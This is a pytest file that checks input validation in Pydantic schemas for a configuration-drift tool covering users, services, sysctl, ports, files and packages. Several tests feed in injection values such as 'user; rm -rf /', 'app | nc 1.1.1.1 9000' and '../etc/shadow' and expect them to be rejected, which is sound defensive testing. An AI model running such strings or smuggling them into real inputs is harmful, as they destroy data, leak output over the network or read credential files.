"""Tests for Pydantic v2 schema definitions and validation rules."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from drift.schema import (
    FileDesired,
    Manifest,
    PackageDesired,
    PortDesired,
    ServiceDesired,
    SysctlDesired,
    UserDesired,
)


class TestUserSchema:
    def test_valid_user(self):
        user = UserDesired.model_validate({
            "name": "deploy",
            "uid": 1001,
            "gid": 1001,
            "shell": "/bin/bash",
            "home": "/home/deploy",
            "groups": ["sudo", "docker"],
            "state": "present",
        })
        assert user.name == "deploy"
        assert user.uid == 1001
        assert user.groups == ["sudo", "docker"]

    def test_invalid_username_injection(self):
        with pytest.raises(ValidationError):
            UserDesired(name="user; rm -rf /")

    def test_invalid_username_special_chars(self):
        with pytest.raises(ValidationError):
            UserDesired(name="user!@#$")

    def test_invalid_group_name(self):
        with pytest.raises(ValidationError):
            UserDesired(name="validuser", groups=["goodgroup", "bad group space"])

    def test_user_negative_uid(self):
        with pytest.raises(ValidationError):
            UserDesired(name="validuser", uid=-5)


class TestServiceSchema:
    def test_valid_service(self):
        svc = ServiceDesired(name="nginx", state="running", enabled=True)
        assert svc.name == "nginx"
        assert svc.state == "running"
        assert svc.enabled is True

    def test_valid_service_with_extension(self):
        svc = ServiceDesired(name="node-exporter.service", state="running")
        assert svc.name == "node-exporter.service"

    def test_invalid_service_injection_semicolon(self):
        with pytest.raises(ValidationError):
            ServiceDesired(name="nginx; reboot")

    def test_invalid_service_injection_pipe(self):
        with pytest.raises(ValidationError):
            ServiceDesired(name="app | nc 1.1.1.1 9000")

    def test_invalid_service_state(self):
        with pytest.raises(ValidationError):
            ServiceDesired(name="nginx", state="invalid_state")  # type: ignore


class TestSysctlSchema:
    def test_valid_sysctl(self):
        sc = SysctlDesired(key="net.ipv4.ip_forward", value=1)
        assert sc.key == "net.ipv4.ip_forward"
        assert sc.value == "1"

    def test_sysctl_path_traversal_rejection(self):
        with pytest.raises(ValidationError):
            SysctlDesired(key="../etc/shadow", value="0")

    def test_sysctl_slash_rejection(self):
        with pytest.raises(ValidationError):
            SysctlDesired(key="net/ipv4/ip_forward", value="1")

    def test_sysctl_special_chars(self):
        with pytest.raises(ValidationError):
            SysctlDesired(key="net.ipv4.ip_forward; id", value="1")


class TestPortSchema:
    def test_valid_port(self):
        p = PortDesired(port=443, protocol="tcp", address="0.0.0.0", state="listening")  # nosec B104
        assert p.port == 443
        assert p.protocol == "tcp"

    def test_port_out_of_range_high(self):
        with pytest.raises(ValidationError):
            PortDesired(port=70000)

    def test_port_out_of_range_low(self):
        with pytest.raises(ValidationError):
            PortDesired(port=0)

    def test_invalid_protocol(self):
        with pytest.raises(ValidationError):
            PortDesired(port=80, protocol="sctp")  # type: ignore

    def test_invalid_address(self):
        with pytest.raises(ValidationError):
            PortDesired(port=80, address="invalid address format")


class TestFileSchema:
    def test_valid_file(self):
        f = FileDesired(
            path="/etc/nginx/nginx.conf",
            mode="0644",
            owner="root",
            group="root",
            sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            state="present",
        )
        assert f.path == "/etc/nginx/nginx.conf"
        assert f.mode == "0644"

    def test_file_mode_normalization(self):
        f = FileDesired(path="/etc/file.txt", mode="644")
        assert f.mode == "0644"

    def test_file_invalid_mode(self):
        with pytest.raises(ValidationError):
            FileDesired(path="/etc/file.txt", mode="9999")

    def test_file_relative_path_rejected(self):
        with pytest.raises(ValidationError):
            FileDesired(path="relative/path/file.txt")

    def test_file_path_traversal_rejected(self):
        with pytest.raises(ValidationError):
            FileDesired(path="/etc/../shadow")

    def test_file_invalid_sha256(self):
        with pytest.raises(ValidationError):
            FileDesired(path="/etc/file.txt", sha256="tooshort")


class TestPackageSchema:
    def test_valid_package(self):
        pkg = PackageDesired(name="curl", version="7.88.1-10+deb12u5", state="present")
        assert pkg.name == "curl"
        assert pkg.state == "present"

    def test_invalid_package_name(self):
        with pytest.raises(ValidationError):
            PackageDesired(name="curl; apt-get update")


class TestManifestSchema:
    def test_valid_manifest(self):
        manifest = Manifest(
            version="1.0",
            name="web-server-tier",
            users=[UserDesired(name="deploy")],
            services=[ServiceDesired(name="nginx")],
            sysctl=[SysctlDesired(key="net.ipv4.tcp_syncookies", value="1")],
            ports=[PortDesired(port=80, protocol="tcp")],
            files=[FileDesired(path="/etc/hosts", mode="0644")],
            packages=[PackageDesired(name="nginx")],
        )
        assert manifest.name == "web-server-tier"
        assert len(manifest.users) == 1
        assert len(manifest.services) == 1

    def test_extra_fields_forbidden(self):
        with pytest.raises(ValidationError):
            Manifest.model_validate({
                "name": "test",
                "version": "1.0",
                "injected_untrusted_field": "exploit_attempt",
            })
